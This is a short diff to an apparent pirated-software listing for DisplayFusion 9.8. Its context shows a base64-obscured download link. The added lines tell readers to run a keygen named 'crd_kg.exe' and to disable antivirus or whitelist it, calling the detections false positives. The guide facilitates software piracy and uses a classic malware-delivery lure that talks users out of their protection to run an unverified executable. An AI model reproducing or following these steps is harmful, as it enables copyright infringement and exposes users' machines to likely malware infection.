@@ -518,6 +518,14 @@ Download:
 Download:
 `aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOUJFOGVFQ3l5U3RGUXg3blJVNzdsNDhsRmc0cDctSTcvdmlldz91c3A9c2hhcmluZw==`
 
+**Installation steps:**
+1.  Extract the archive
+2.  Run the "DisplayFusionSetup-9.8.exe" and install the software
+3.  Extract the keygen archive
+4.  Run the "crd_kg.exe" to apply the crack.
+
+*Note: Keygens are almost always going to trigger your antivirus. It's a false positive. Disable your AV or make an exception so it does not delete the keygen.*
+
 [Official Site](https://www.displayfusion.com/)
 
 
